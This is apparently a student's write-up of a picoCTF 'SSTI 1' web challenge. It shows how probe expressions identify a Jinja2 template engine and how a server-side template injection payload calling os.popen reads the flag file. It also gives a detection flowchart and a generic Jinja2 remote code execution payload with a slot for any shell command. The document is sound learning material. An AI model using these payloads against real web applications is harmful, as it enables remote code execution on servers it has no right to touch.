# SSTI 1
**Category:** Web Exploitation  
**Date:** 26.04.2026  
**Difficulty:** Easy

Author: VENAX
Description
I made a cool website where you can announce whatever you want! Try it out!
Additional details will be available after launching your challenge instance.


Tools : 
1. Chrome and Google (just for visiting target website and research about ssti)
2. Claude AI (research about ssti and injection payloads)


How to get Flag : 
1. Test the input with normal input : Hello Welt!. It returns the input: Hello Welt! as annoncement.

2. I tried to inject the following payloads : 
 {{"Hello" + "world"}}, returns Hello world
 {{7*7}}, returns 49
 *These behaviours indicates template engine of Jinja2 or Twig
 I tested another payload : 
 {{7*'7'}}, returns 7777777
 *Ok, now it is surely Jinja2 template engine that is used in this web app
 

3. I just guessed it randomly that the flag must be stored in a file called 'flag' in the server
 That's why I used this injection payload to search the file named flag in the server : 
 {{config.__class__.__init__.__globals__['os'].popen('find / -name "flag*" 2>/dev/null').read()}}

 *It returns a lot of nonsense infos but I recognized a file path which most likely stores the flag :
 /challenge/flag

 I injected another payload to cat the file /challenge/flag
 {{config.__class__.__init__.__globals__['os'].popen('cat /challenge/flag').read()}}
 *It returns the flag : picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_9451989d} 

Side note : 
 SSTI (Server Side Template Injection) is a common web vulnerability which happens when a template engine is used 
 and not configured properly. It occurs when the user input passed, processed and evaluated/executed as a data 
 by the server rather than being parsed and treated as a plain text. The attacker can inject a payload to gain 
 access/control of a system using this vulnerability. This technique is called as RCE (Remote Code Execution)

Flag : picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_9451989d}

What I learned : 
1. SSTI Vulnerability is a web vulnerability where the user input passed and being evaluated/executed by the template engine
2. RCE, a technique where a payload code is injected as a user input to access/control the server

Workflow to detect SSTI Vulnerability : 
 inject {{7*7}}, works? // if it works (returns 49), now decide which engine
  |
  ├── YES → try {{7*'7'}}
  │         ├── returns 49  -> Twig
  │         └── returns 7777777 -> Jinja2
  └── NO  → try ${7*7}
            └── returns 49 -> Freemarker / Mako

Injection payload for Jinja2 (common engine for CTF) :
 {{config.__class__.__init__.__globals__['os'].popen('PUT_YOUR_CLI_COMMAND_HERE').read()}}
